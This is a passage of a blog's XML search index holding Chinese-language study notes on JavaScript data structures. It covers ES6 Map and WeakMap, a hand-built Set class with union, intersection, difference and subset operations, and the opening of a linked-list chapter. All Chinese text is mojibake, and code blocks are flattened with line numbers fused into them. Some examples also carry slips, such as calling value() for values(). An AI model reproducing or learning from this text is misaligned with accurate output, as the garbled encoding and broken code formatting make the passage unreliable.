è¿™å¹¶ä¸æ˜¯æœ€å¥½çš„æ•£åˆ—å‡½æ•°ï¼Œä½†æ˜¯æ˜¯ç¤¾åŒºæœ€è¢«æŽ¨å´‡çš„æ•£åˆ—å‡½æ•°ä¹‹ä¸€ã€‚ ES6â€”â€”Mapç±»ES6ä¸­æœ‰Map,æˆ‘ä»¬å¯ä»¥åŸºäºŽè¿™ä¸ªç±»æ¥å¼€å‘Dictionary ç±» 12345678910111213141516171819const map = new Map();map.set('Gandalf','Gandalf@qq.com');map.set('John','John@qq.com');map.set('Tyrion','Tyrion@qq.com');map.set('Aaron','Aaron@qq.com');map.set('Donnie','Donnie@qq.com');map.set('Ana','Ana@qq.com');map.set('Jonathan','Jonathan@qq.com');map.set('Jamie','Jamie@qq.com');map.set('Sue','Sue@qq.com');map.set('Mindy','Mindy@qq.com');map.set('Paul','Paul@qq.com');map.set('Nathan','Nathan@qq.com');console.log(map.has('Gandalf')); //true console.log(map.size); // 12console.log(map.keys()); // MapIteratorconsole.log(map.values()); // MapIteratorconsole.log(map.get('Gandalf')); // Gandalf@qq.com å¯ä»¥çœ‹åˆ°ï¼Œvalues å’Œ keys æ–¹æ³•è¿”å›žéƒ½æ˜¯ MapIteratorï¼Œè€Œä¸æ˜¯å€¼æˆ–é”®æž„æˆçš„æ•°ç»„ã€‚å¦ä¸€ä¸ªåŒºåˆ«æ˜¯ï¼Œsize æ˜¯å±žæ€§ã€‚ åˆ é™¤ map ä¸­çš„å…ƒç´ å¯ä»¥ç”¨ delete æ–¹æ³• 1map.delete('Gandalf'); clear æ–¹æ³•ä¼šé‡ç½® map æ•°æ®ç»“æž„ï¼Œè¿™è·Ÿæˆ‘ä»¬åœ¨ä¹‹å‰çš„å®žçŽ°æ—¶ä¸€æ ·çš„ã€‚ ES6â€”â€”WeakMap ç±» å’Œ WeakSet ç±»é™¤äº† Set å’Œ Map ä¸¤ç§æ–°çš„æ•°æ®ç»“æž„ï¼ŒES6è¿˜å¢žåŠ äº†å®ƒä»¬çš„å¼±åŒ–ç‰ˆæœ¬ï¼ŒWeakMap å’Œ WeakSet ç±»ã€‚ åŸºæœ¬ä¸Šï¼ŒMap å’Œ Set ä¸Žå…¶å¼±åŒ–ç‰ˆæœ¬ä¹‹é—´ä»…æœ‰çš„åŒºåˆ«æ˜¯ WeakMap å’Œ WeakSet ç±»æ²¡æœ‰ entriesã€keysã€values ç­‰æ–¹æ³•ã€‚ åªèƒ½ç”¨å¯¹è±¡ä½œä¸ºé”® åˆ›å»ºå’Œä½¿ç”¨è¿™ä¸¤ä¸ªç±»ä¸»è¦æ˜¯ä¸ºäº†æ€§èƒ½ã€‚æ²¡æœ‰å¼ºå¼•ç”¨çš„é”®ï¼Œè¿™ä½¿å¾—JavaScript çš„åžƒåœ¾å›žæ”¶å™¨å¯ä»¥ä»Žä¸­æ¸…é™¤æ•´ä¸ªå…¥å£ã€‚ å¦å¤–çš„ä¸€ä¸ªä¼˜ç‚¹æ˜¯ï¼Œå¿…é¡»ç”¨é”®æ‰å¯ä»¥å–å‡ºå€¼ã€‚è¿™äº›ç±»æ²¡æœ‰ entries ã€keysã€values ç­‰è¿­ä»£å™¨æ–¹æ³•ï¼Œå› æ­¤ï¼Œé™¤éžä½ çŸ¥é“é”®ï¼Œå¦åˆ™æ²¡æœ‰åŠžæ³•å–å‡ºå€¼ã€‚ å°ç»“æœ¬ç« ï¼Œæˆ‘ä»¬å­¦ä¹ äº†å­—å…¸çš„ç›¸å…³çŸ¥è¯†ï¼Œäº†è§£äº†å¦‚ä½•æ·»åŠ ã€ç§»é™¤å’ŒèŽ·å–å…ƒç´ å·²ç»å…¶ä»–çš„ä¸€äº›æ–¹æ³•ï¼Œæˆ‘ä»¬è¿˜äº†è§£äº†å­—å…¸å’Œé›†åˆçš„ä¸åŒä¹‹å¤„ã€‚ å­¦ä¹ äº†æ•£åˆ—è¿ç®—ï¼ŒçŸ¥é“è¯¥æ€Žä¹ˆåŽ»åˆ›å»ºä¸€ä¸ªæ•£åˆ—è¡¨æ•°æ®ç»“æž„ï¼Œå¦‚ä½•åˆ›å»ºä¸€ä¸ªæ•£åˆ—å‡½æ•°ã€‚ ä¸‹ä¸€ç« ï¼Œæˆ‘ä»¬å°†å­¦ä¹ ä¸€ç§æ–°çš„æ•°æ®ç»“æž„â€”â€”æ ‘ã€‚ ä¹¦ç±é“¾æŽ¥ï¼š å­¦ä¹ JavaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•]]></content>
      <categories>
        <category>javaScriptç›¸å…³</category>
      </categories>
      <tags>
        <tag>javaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¸ºä»€ä¹ˆæˆ‘è¦æ”¾å¼ƒjavaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•ï¼ˆç¬¬å…­ç« ï¼‰â€”â€” é›†åˆ]]></title>
    <url>%2F2018-11-01-JavaScipt%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95Part6.html</url>
    <content type="text"><![CDATA[å‰é¢å·²ç»å­¦ä¹ äº†æ•°ç»„ï¼ˆåˆ—è¡¨ï¼‰ã€æ ˆã€é˜Ÿåˆ—å’Œé“¾è¡¨ç­‰é¡ºåºæ•°æ®ç»“æž„ã€‚è¿™ä¸€ç« ï¼Œæˆ‘ä»¬è¦å­¦ä¹ é›†åˆï¼Œè¿™æ˜¯ä¸€ç§ä¸å…è®¸å€¼é‡å¤çš„é¡ºåºæ•°æ®ç»“æž„ã€‚ æœ¬ç« å¯ä»¥å­¦ä¹ åˆ°ï¼Œå¦‚ä½•æ·»åŠ å’Œç§»é™¤å€¼ï¼Œå¦‚ä½•æœç´¢å€¼æ˜¯å¦å­˜åœ¨ï¼Œä¹Ÿå¯ä»¥å­¦ä¹ å¦‚ä½•è¿›è¡Œå¹¶é›†ã€äº¤é›†ã€å·®é›†ç­‰æ•°å­¦æ“ä½œï¼Œè¿˜å¯ä»¥å­¦åˆ°å¦‚ä½•ä½¿ç”¨ES6 åŽŸç”Ÿçš„ Setç±» ç¬¬å…­ç«  é›†åˆæž„å»ºæ•°æ®é›†åˆé›†åˆæ˜¯ç”±ä¸€ç»„æ— åºä¸”å”¯ä¸€ï¼ˆå³ä¸é‡å¤ï¼‰çš„é¡¹ç»„æˆçš„ã€‚è¿™ä¸ªæ•°æ®ç»“æž„ä½¿ç”¨äº†ä¸Žæœ‰é™é›†åˆç›¸åŒçš„å±žæ€§æ¦‚å¿µï¼Œä½†åº”ç”¨åœ¨è®¡ç®—æœºç§‘å­¦çš„æ•°æ®ç»“æž„ä¸­ã€‚ åœ¨æ•°å­¦ä¸­ï¼Œé›†åˆæ—¶ä¸€ç»„ä¸åŒçš„å¯¹è±¡ï¼ˆçš„é›†ï¼‰ã€‚ æ¯”å¦‚è¯´ï¼Œä¸€ä¸ªç”±å¤§äºŽæˆ–ç­‰äºŽ0 çš„æ•´æ•°ç»„æˆçš„è‡ªç„¶æ•°é›†åˆï¼š Nï¼š{0,1,2,3,4,5,6ï¼Œ...}ã€‚åœ¨é›†åˆä¸­çš„å¯¹è±¡åˆ—è¡¨ç”¨ {}ï¼ˆå¤§æ‹¬å·ï¼‰åŒ…å›´ è¿˜æœ‰ä¸€ä¸ªæ¦‚å¿µå«åšç©ºé›†ã€‚ç©ºé›†å°±æ˜¯ä¸åŒ…å«ä»»ä½•å…ƒç´ çš„é›†åˆã€‚ å¯ä»¥æŠŠé›†åˆæƒ³è±¡æˆä¸€ä¸ªæ—¢æ²¡æœ‰é‡å¤å…ƒç´ ï¼Œä¹Ÿæ²¡æœ‰é¡ºåºæ¦‚å¿µçš„æ•°ç»„ã€‚ åœ¨æ•°å­¦ä¸­ï¼Œé›†åˆä¹Ÿæœ‰å¹¶é›†ã€äº¤é›†ã€å·®é›†ç­‰åŸºæœ¬æ“ä½œã€‚ åˆ›å»ºé›†åˆä¸‹é¢Setç±»çš„éª¨æž¶ 123function Set()&#123; let items = &#123;&#125;;&#125; æˆ‘ä»¬ä½¿ç”¨å¯¹è±¡è€Œä¸æ˜¯æ•°ç»„æ¥è¡¨ç¤ºé›†åˆï¼ˆitemsï¼‰,ä½†ä¹Ÿå¯ä»¥ç”¨æ•°ç»„å®žçŽ°ã€‚è¿™é‡Œæˆ‘ä»¬ç”¨å¯¹è±¡æ¥å®žçŽ°ï¼ŒåŒæ—¶ï¼ŒJavaScript å¯¹è±¡ä¸å…è®¸ä¸€ä¸ªé”®æŒ‡å‘ä¸¤ä¸ªä¸åŒçš„å±žæ€§ï¼Œä¹Ÿä¿è¯äº†é›†åˆé‡Œçš„å…ƒç´ éƒ½æ˜¯å”¯ä¸€çš„ã€‚ æŽ¥ä¸‹æ¥ï¼Œéœ€è¦å£°æ˜Žä¸€äº›ç»“åˆå¯ç”¨çš„æ–¹æ³• add(value)ï¼šå‘é›†åˆæ·»åŠ ä¸€ä¸ªæ–°çš„é¡¹ remove(value)ï¼šä»Žé›†åˆç§»é™¤ä¸€ä¸ªå€¼ has(value)ï¼šå¦‚æžœå€¼åœ¨é›†åˆä¸­ï¼Œè¿”å›ž true,å¦åˆ™è¿”å›ž false clear()ï¼šç§»é™¤é›†åˆä¸­çš„æ‰€æœ‰é¡¹ size()ï¼šè¿”å›žé›†åˆæ‰€åŒ…å«å…ƒç´ çš„å€¼ï¼Œä¸Žæ•°ç»„çš„ length å±žæ€§ç±»ä¼¼ values()ï¼šè¿”å›žä¸€ä¸ªåŒ…å«é›†åˆä¸­æ‰€æœ‰å€¼çš„æ•°ç»„ has(value)æ–¹æ³•é¦–å…ˆè¦å®žçŽ°çš„å°±æ˜¯ has(value)æ–¹æ³•ï¼Œè¿™æ˜¯å› ä¸ºå®ƒä¼šè¢« addã€remove ç­‰æ–¹æ³•è°ƒç”¨ã€‚ 123this.has = function(value)&#123; return value in items;&#125; æ—¢ç„¶æˆ‘ä»¬ä½¿ç”¨å¯¹è±¡æ¥å­˜å‚¨é›†åˆçš„å€¼ï¼Œå°±å¯ä»¥ä½¿ç”¨ JavaScript çš„ in æ“ä½œç¬¦æ¥éªŒè¯ç»™å®šçš„å€¼æ˜¯å¦æ˜¯ items å¯¹è±¡çš„å±žæ€§ã€‚ ä½†è¿™ä¸ªæ–¹æ³•è¿˜æœ‰ä¸€ä¸ªæ›´å¥½çš„å®žçŽ°æ–¹å¼ 123this.has = function(value)&#123; return items.hasOwnProperty(value);&#125; æ‰€æœ‰çš„ JavaScript å¯¹è±¡éƒ½æœ‰ hasOwnPropertyæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›žä¸€ä¸ªè¡¨æ˜Žå¯¹è±¡æ˜¯å¦å…·æœ‰ç‰¹å®šå±žæ€§çš„å¸ƒå°”å€¼ã€‚ in å’Œ hasOwnProperty çš„åŒºåˆ« inåˆ¤æ–­çš„æ˜¯å¯¹è±¡çš„æ‰€æœ‰å±žæ€§ï¼ŒåŒ…æ‹¬å¯¹è±¡å®žä¾‹åŠå…¶åŽŸåž‹çš„å±žæ€§ã€‚è€ŒhasOwnPropertyåˆ™æ˜¯åˆ¤æ–­å¯¹è±¡å®žä¾‹çš„æ˜¯å¦å…·æœ‰æŸä¸ªå±žæ€§ã€‚ è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆ for in å¾ªçŽ¯çš„æ—¶å€™ä¼šå»ºè®®ä½¿ç”¨ hasOwnPropertyè¿›è¡Œè¿‡æ»¤ï¼Œåœ¨ä½¿ç”¨äº† eslint æ‰ä¸ä¼šæŠ¥è­¦å‘Š,åŒæ—¶ä¹Ÿæ˜¯ä¸ºäº†å¯ä»¥æœ‰æ•ˆé¿å…æ‰©å±•æœ¬åœ°åŽŸåž‹è€Œå¼•èµ·çš„é”™è¯¯ã€‚ 1234for (var i in foo) &#123; if (foo.hasOwnProperty(i)) &#123; console.log(i); &#125; add æ–¹æ³•1234567this.add = function(value)&#123; if(!this.has(value))&#123; items[value] = value return true &#125; return false;&#125; å¯¹äºŽç»™å®šçš„ valueï¼Œå¯ä»¥æ£€æµ‹æ˜¯å¦å­˜åœ¨äºŽé›†åˆä¸­ã€‚å¦‚æžœä¸å­˜åœ¨ï¼Œå°±æŠŠ value æ·»åŠ åˆ°ç»“åˆä¸­ï¼Œè¿”å›ž true,è¡¨ç¤ºæ·»åŠ äº†è¿™ä¸ªå€¼ã€‚å¦‚æžœé›†åˆä¸­ï¼Œå·²ç»æœ‰äº†ï¼Œå°±è¿”å›ž false,è¡¨ç¤ºæ²¡æœ‰æ·»åŠ å®ƒã€‚ remove å’Œ clear æ–¹æ³•remove æ–¹æ³• 1234567this.remove = function(value)&#123; if(this.has(value))&#123; delete items[value]; return true; &#125; return false;&#125; å› ä¸ºä½¿ç”¨å¯¹è±¡æ¥å­˜å‚¨é›†åˆçš„ items å¯¹è±¡ï¼Œå¯ä»¥ç®€å•ä½¿ç”¨ delete æ“ä½œç¬¦ä»Ž items å¯¹è±¡ä¸­ç§»é™¤å±žæ€§ clear æ–¹æ³• 123this.clear = function()&#123; items = &#123;&#125;;&#125; é‡ç½® items å¯¹è±¡ï¼Œéœ€è¦åšçš„åªæ˜¯æŠŠä¸€ä¸ªç©ºå¯¹è±¡é‡æ–°èµ‹å€¼ç»™å®ƒï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è¿­ä»£é›†åˆï¼Œç”¨ remove æ–¹æ³•ä¾æ¬¡ç§»é™¤æ‰€æœ‰çš„å€¼ï¼Œä½†æ—¢ç„¶æœ‰æ›´ç®€å•çš„æ–¹æ³•ï¼Œé‚£æ ·åšå°±å¤ªéº»çƒ¦äº†ã€‚ size æ–¹æ³•è¿”å›žé›†åˆä¸­æœ‰å¤šå°‘é¡¹ï¼Œæœ‰ä¸‰ç§å®žçŽ°æ–¹æ³• ç¬¬ä¸€ç§æ˜¯åƒä¹‹å‰ä¸€æ ·ï¼Œä½¿ç”¨ length å˜é‡ï¼Œæ¯å½“ç§»é™¤æˆ–è€…æ·»åŠ çš„æ—¶å€™æŽ§åˆ¶å®ƒã€‚ ç¬¬äºŒç§æ˜¯ä½¿ç”¨ JavsScript å†…å»ºçš„ Object ç±»çš„ä¸€ä¸ªå†…å»ºå‡½æ•° 123this.size = function()&#123; return Object.keys(items).length&#125; JavaScript çš„ Object ç±»æœ‰ä¸€ä¸ª keys æ–¹æ³•ï¼Œå®ƒè¿”å›žä¸€ä¸ªåŒ…å«ç»™å®šå¯¹è±¡æ‰€æœ‰å±žæ€§çš„æ•°ç»„ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªæ•°ç»„çš„ length å±žæ€§æ¥è¿”å›ž items å¯¹è±¡çš„å±žæ€§ä¸ªæ•°ã€‚ ç¬¬ä¸‰ç§æ–¹æ³•æ˜¯æ‰‹åŠ¨æå– items å¯¹è±¡çš„æ¯ä¸€ä¸ªå±žæ€§ï¼Œè®°å½•å±žæ€§çš„ä¸ªæ•°å¹¶è¿”å›žè¿™ä¸ªæ•°å­—ã€‚ 123456789this.size = function()&#123; let count = 0; for(let key in items)&#123; if(items.hasOwnProperty(key))&#123; ++count; &#125; &#125; return count;&#125; éåŽ† items å¯¹è±¡çš„æ‰€æœ‰å±žæ€§ï¼Œæ£€æŸ¥å®ƒä»¬æ˜¯å¦æ˜¯å¯¹è±¡è‡ªèº«çš„å±žæ€§ï¼ˆé¿å…é‡å¤è®¡æ•°ï¼‰ï¼Œå¦‚æžœæ˜¯ï¼Œå°±é€’å¢ž count å˜é‡çš„å€¼ï¼Œæœ€åŽåœ¨æ–¹æ³•ç»“æŸæ—¶è¿”å›žè¿™ä¸ªæ•°å­—ã€‚ values æ–¹æ³•values æ–¹æ³•ä¹Ÿåº”ç”¨äº†ç›¸åŒçš„é€»è¾‘ï¼Œæå– items å¯¹è±¡çš„æ‰€æœ‰å±žæ€§ï¼Œä»¥æ•°ç»„çš„å½¢å¼è¿”å›ž 1234567this.values = function()&#123; let values = []; for(let i=0 , keys=Object.keys(items); i&lt;keys.length; i++)&#123; values.push(items[keys[i]]); &#125; return values;&#125; è¿˜æœ‰å…¼å®¹æ—§æµè§ˆå™¨çš„å†™æ³• 123456789this.values = function()&#123; let values = []; for(let key in items)&#123; if(items.hasOwnProperty(key))&#123; values.push(items[key]) &#125; &#125; return values;&#125; Setç±»å…¨éƒ¨ä»£ç 1234567891011121314151617181920212223242526272829303132333435363738394041function Set()&#123; let items = &#123;&#125;; this.has = function(value)&#123; return items.hasOwnProperty(value); &#125; this.add = function(value)&#123; if(!this.has(value))&#123; items[value] = value return true &#125; return false; &#125; this.remove = function(value)&#123; if(this.has(value))&#123; delete items[value]; return true; &#125; return false; &#125; this.clear = function()&#123; items = &#123;&#125;; &#125; this.size = function()&#123; let count = 0; console.log(items); for(let key in items)&#123; if(items.hasOwnProperty(key))&#123; ++count; &#125; &#125; return count; &#125; this.values = function()&#123; let values = []; for(let i=0 , keys=Object.keys(items); i&lt;keys.length; i++)&#123; values.push(items[keys[i]]); &#125; return values; &#125;&#125; ä½¿ç”¨ Setç±»çŽ°åœ¨æ•°æ®ç»“æž„å·²ç»å®Œæˆäº† ã€‚æµ‹è¯•ä¸€ä¸‹ 123456789101112131415let set = new Set(); // æ–°å»º Setç±» å®žä¾‹set.add(1); set.add(2);set.add(3);set.add('j');console.log(set.has(2)); // trueconsole.log(set.size()); // 4console.log(set.value()); // [1, 2, 3, "j"]set.remove(2);console.log(set.has(2)); // false console.log(set.size()); // 3console.log(set.value()); // [1, 3, "j"]set.clear();console.log(set.size()); // 0console.log(set.value()); // [] é›†åˆæ“ä½œå¯¹é›†åˆå¯ä»¥è¿›è¡Œä»¥ä¸‹æ“ä½œ å¹¶é›†ï¼šå¯¹äºŽç»™å®šçš„ä¸¤ä¸ªé›†åˆï¼Œè¿”å›žä¸€ä¸ªåŒ…å«ä¸¤ä¸ªé›†åˆä¸­æ‰€æœ‰å…ƒç´ çš„æ–°é›†åˆ äº¤é›†ï¼šå¯¹äºŽç»™å®šçš„ä¸¤ä¸ªé›†åˆï¼Œè¿”å›žä¸€ä¸ªåŒ…å«ä¸¤ä¸ªé›†åˆä¸­å…±æœ‰å…ƒç´ çš„æ–°é›†åˆ å·®é›†ï¼šå¯¹äºŽç»™å®šçš„ä¸¤ä¸ªé›†åˆï¼Œè¿”å›žä¸€ä¸ªæ‰€æœ‰å­˜åœ¨äºŽç¬¬ä¸€ä¸ªé›†åˆä¸”ä¸å­˜åœ¨äºŽç¬¬äºŒä¸ªé›†åˆçš„å…ƒç´ çš„æ–°é›†åˆ å­—é›†ï¼šéªŒè¯ä¸€ä¸ªç»™å®šçš„é›†åˆæ˜¯å¦æ˜¯å¦ä¸€ä¸ªçš„å­é›†ã€‚ å¹¶é›†12345678910111213// å¹¶é›†this.union = function(otherSet)&#123; let unionSet = new Set(); let values = this.values(); for(let i = 0; i &lt; values.length; i++)&#123; unionSet.add(values[i]); &#125; values = otherSet.values(); for(let i = 0; i &lt; values.length; i++)&#123; unionSet.add(values[i]); &#125; return unionSet;&#125; é¦–å…ˆéœ€è¦åˆ›å»ºä¸€ä¸ªæ–°çš„é›†åˆï¼Œä»£è¡¨ä¸¤ä¸ªé›†åˆçš„å¹¶é›†ï¼ŒèŽ·å–ç¬¬ä¸€ä¸ªé›†åˆï¼ˆå½“å‰Setç±»å®žä¾‹ï¼‰æ‰€æœ‰å€¼ï¼ˆvaluesï¼‰ï¼ŒéåŽ†å¹¶æ·»åŠ åˆ°ä»£è¡¨å¹¶é›†çš„é›†åˆä¸­ã€‚ç„¶åŽå¯¹ç¬¬äºŒä¸ªé›†åˆåšåŒæ ·çš„äº‹æƒ…ï¼Œæœ€åŽè¿”å›žç»“æžœã€‚ æµ‹è¯•ä¸Šé¢çš„ä»£ç  12345678910111213let setA = new Set();setA.add(1); setA.add(2); setA.add(3); let setB = new Set();setB.add(3);setB.add(4);setB.add(5);setB.add(6);console.log(setA.values()); // [1, 2, 3]console.log(setB.values()); // [3, 4, 5, 6]let unionAB = setA.union(setB);console.log(unionAB.values()); // [1, 2, 3, 4, 5, 6] å¯ä»¥æ³¨æ„åˆ°å…ƒç´  3åŒæ—¶å­˜åœ¨äºŽAå’ŒBä¸­ï¼Œä½†æ˜¯é›†åˆé‡Œåªè¾“å‡ºäº†ä¸€æ¬¡ äº¤é›†1234567891011// äº¤é›†this.intersection = function(otherSet)&#123; let intersectionSet = new Set(); let values = this.values(); for(let i = 0;i &lt;values.length; i++)&#123; if(otherSet.has(values[i]))&#123; intersectionSet.add(values[i]); &#125; &#125; return intersectionSet;&#125; éªŒè¯ 12let intersectionSetAB = setA.intersection(setB);console.log(intersectionSetAB.values()); // [3] å·®é›†1234567891011// å·®é›†this.difference = function(otherSet)&#123; let differenceSet = new Set(); let values = this.values(); for(let i = 0; i &lt; values.length; i++)&#123; if(!otherSet.has(values[i]))&#123; differenceSet.add(values[i]); &#125; &#125; return differenceSet;&#125; éªŒè¯ 12let differenceSetAB = setA.difference(setB);console.log(differenceSetAB.values()); // [1, 2] differenceSetAB ä¼šå¾—åˆ°æ‰€æœ‰å­˜åœ¨äºŽé›†åˆA ä½†ä¸å­˜åœ¨ä¸Žé›†åˆBçš„å€¼ã€‚ å­é›†1234567891011121314// å­é›†this.subset = function(otherSet)&#123; if(this.size() &gt; otherSet.size())&#123; return false &#125;else&#123; let values = this.values(); for(let i = 0; i &lt; values.length; i++)&#123; if(!otherSet.has(values[i]))&#123; return false; &#125; &#125; return true; &#125;&#125; é¦–è¦è¦éªŒè¯å½“å‰Setå®žä¾‹çš„å¤§å°ï¼Œå¦‚æžœå½“å‰å®žä¾‹ä¸­çš„å…ƒç´ æ¯” otherSet å®žä¾‹æ›´å¤šï¼Œå®ƒå°±ä¸æ˜¯ä¸€ä¸ªå­é›†ã€‚å­é›†çš„å…ƒç´ ä¸ªæ•°éœ€è¦å°äºŽæˆ–ç­‰äºŽè¦æ¯”è¾ƒçš„é›†åˆã€‚ æŽ¥ä¸‹æ¥éåŽ†æ‰€æœ‰é›†åˆä¸­çš„å…ƒç´ ï¼ŒéªŒè¯è¿™äº›å…ƒç´ ä¹Ÿå­˜åœ¨äºŽ otherSet ä¸­ï¼Œå¦‚æžœæœ‰ä»»ä½•å…ƒç´ ä¸å­˜åœ¨ä¸Ž otherSet ä¸­çš„ï¼Œè¿™æ„å‘³ç€å®ƒä¸æ˜¯ä¸€ä¸ªå­é›†ï¼Œè¿”å›ž falseã€‚å¦‚æžœæ‰€æœ‰å…ƒç´ éƒ½å­˜åœ¨äºŽ otherSet ä¸­ï¼Œå°±è¿”å›ž trueã€‚ éªŒè¯ 1234567let subSetAB = setA.subset(setB);console.log(subSetAB); // false setB.add(1); setB.add(2); setB.add(3); console.log(subSetAB); // true ES6â€”â€”Setç±»ES6æ–°å¢žäº† Set ç±»ï¼Œæˆ‘ä»¬å¯ä»¥åŸºäºŽ ES6 çš„ Set å¼€å‘æˆ‘ä»¬çš„ Set ç±» 12345let set = new Set();set.add(1);console.log(set.values()); // SetIterator &#123;1&#125;console.log(set.has(1)); // trueconsole.log(set.size); // 1 ES6çš„values æ–¹æ³•ä¼šè¿”å›ž Iteratorï¼Œè€Œä¸æ˜¯å€¼æž„æˆçš„æ•°ç»„ï¼Œéœ€è¦é€šè¿‡ next() æ–¹æ³•æ¥éåŽ†èŽ·å–å€¼ï¼Œå¦å¤–size æ˜¯ä¸€ä¸ªå±žæ€§ä¸æ˜¯ä¸€ä¸ªæ–¹æ³•ã€‚ å¯ä»¥ç”¨ delete æ–¹æ³•åˆ é™¤ set ä¸­çš„å…ƒç´  1set.delete(1); // true clear æ–¹æ³•ä¼šé‡ç½® set æ•°æ®ç»“æž„ï¼Œè·Ÿæˆ‘ä»¬å®žçŽ°çš„åŠŸèƒ½ä¸€æ ·ã€‚ ES6 Setç±»çš„æ“ä½œæˆ‘ä»¬çš„Setç±»å®žçŽ°äº†äº¤é›†ã€å·®é›†ã€å¹¶é›†ã€å­é›†ç­‰æ•°å­¦æ“ä½œï¼Œç„¶åŽES6 åŽŸç”Ÿçš„Set å¹¶æ²¡æœ‰è¿™äº›åŠŸèƒ½ï¼Œä¸è¿‡æˆ‘ä»¬å¯ä»¥å°è¯•æ¨¡æ‹Ÿã€‚ ä¾‹å­ 12345678let setA = new Set();setA.add(1);setA.add(2);setA.add(3);let setB = new Set();setB.add(2);setB.add(3);setB.add(4); æ¨¡æ‹Ÿå¹¶é›†æ“ä½œæ¨¡æ‹Ÿäº¤é›†æ“ä½œéœ€è¦åˆ›å»ºä¸€ä¸ªè¾…åŠ©å‡½æ•°ï¼Œæ¥ç”ŸæˆåŒ…å« setA å’Œ setB éƒ½æœ‰çš„å…ƒç´ çš„æ–°é›†åˆã€‚ 12345let unionAB = new Set();for(let x of setA) unionAB.add(x);for(let x of setB) unionAB.add(x);console.log(unionAB); // Set(4) &#123;1, 2, 3, 4&#125; æ¨¡æ‹Ÿäº¤é›†æ“ä½œ1234567891011let intersection = function(SetA,SetB)&#123; let intersectionSet = new Set(); for(let x of SetA)&#123; if(SetB.has(x))&#123; intersectionSet.add(x); &#125; &#125; return intersectionSet;&#125;let intersectionSetAB = intersection(setA,setB);console.log(intersectionSetAB); // Set(2) &#123;2, 3&#125; ä¹Ÿå¯ä»¥ç”¨ç®€å•çš„è¯­æ³•å®žçŽ° 1let intersectionSetAB = new Set([x for (x of setA) if (setB.has(x))]) ä½†æ˜¯ç®€åŒ–çš„å‡½æ•°ï¼Œç›®å‰åªæœ‰åœ¨ç«ç‹æ‰å¯ä»¥è¿è¡Œã€‚ æ¨¡æ‹Ÿå·®é›†æ“ä½œ1234567891011let difference = function(SetA,SetB)&#123; let differenceSet = new Set(); for(let x of SetA)&#123; if(!SetB.has(x))&#123; differenceSet.add(x); &#125; &#125; return differenceSet;&#125;let differenceSetAB = difference(setA,setB);console.log(differenceSetAB); // Set(1) &#123;1&#125; å°ç»“å­¦ä¹ äº†ä»Žå¤´å®žçŽ°ä¸€ä¸ªES6ä¸­å®šä¹‰çš„ç±»ä¼¼çš„Set ç±»ï¼Œè¿˜å®žçŽ°äº†ä¸€äº›å†å…¶ä»–è¯­è¨€çš„é›†åˆæ•°æ®ç»“æž„ä¸­ä¸å¸¸è§çš„ä¸€äº›æ–¹æ³•ï¼Œä¾‹å¦‚å¹¶é›†ã€äº¤é›†ã€å·®é›†å’Œå­é›†ã€‚ åŽé¢ï¼Œå°†ä¼šä»‹ç»æ•£åˆ—å’Œå­—å…¸è¿™ä¸¤ç§éžé¡ºåºæ•°æ®ç»“æž„ã€‚ ä¹¦ç±é“¾æŽ¥ï¼š å­¦ä¹ JavaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•]]></content>
      <categories>
        <category>javaScriptç›¸å…³</category>
      </categories>
      <tags>
        <tag>javaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¸ºä»€ä¹ˆæˆ‘è¦æ”¾å¼ƒjavaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•ï¼ˆç¬¬äº”ç« ï¼‰â€”â€” é“¾è¡¨]]></title>
    <url>%2F2018-10-30-JavaScipt%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95Part5.html</url>
    <content type="text"><![CDATA[è·ç¦»ç¬¬å››ç« çš„å®Œæˆå·²ç»è¿‡åŽ»äº†ä¸¤ä¸ªæœˆäº†ï¼Œè¿™æ®µæœŸé—´ï¼Œç”±äºŽå­¦ä¹  nodeJSã€ã€Šå›¾è§£httpã€‹ä»¥åŠé¡¹ç›®ï¼Œæš‚æ—¶æŠŠè¿™æœ¬ä¹¦ä¸¢ä¸‹äº†ã€‚ä»Šå¤©é¡¹ç›®å·²ç»å®Œæˆäº†ä¸ƒä¸ƒå…«å…«ï¼Œå…¶ä»–å‡ æœ¬ä¹¦ä¹Ÿçœ‹å®Œäº†ï¼Œè¶ç€æœ‰æ—¶é—´ï¼Œæ¥ç»§ç»­å­¦ä¹ è¿™æœ¬ä¹¦çš„ç¬¬äº”ç« â€”â€”é“¾è¡¨ã€‚ è¿™ä¸€ç« ä½ å°†ä¼šå­¦ä¼šå¦‚ä½•å®žçŽ°å’Œä½¿ç”¨é“¾è¡¨è¿™ç§åŠ¨æ€çš„æ•°æ®ç»“æž„ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ä»Žä¸­ä»»æ„æ·»åŠ æˆ–ç§»é™¤é¡¹ï¼Œå®ƒä¼šæŒ‰éœ€è¿›è¡Œæ‰©å¼ ã€‚ æœ¬ç« å†…å®¹ é“¾è¡¨æ•°æ®ç»“æž„ å‘é“¾è¡¨æ·»åŠ å…ƒç´  ä»Žé“¾è¡¨ç§»é™¤å…ƒç´  ä½¿ç”¨ LinkedList ç±» åŒå‘é“¾è¡¨ å¾ªçŽ¯é“¾è¡¨ ç¬¬äº”ç«  é“¾è¡¨é“¾è¡¨æ•°æ®ç»“æž„è¦å­˜å‚¨å¤šä¸ªå…ƒç´ 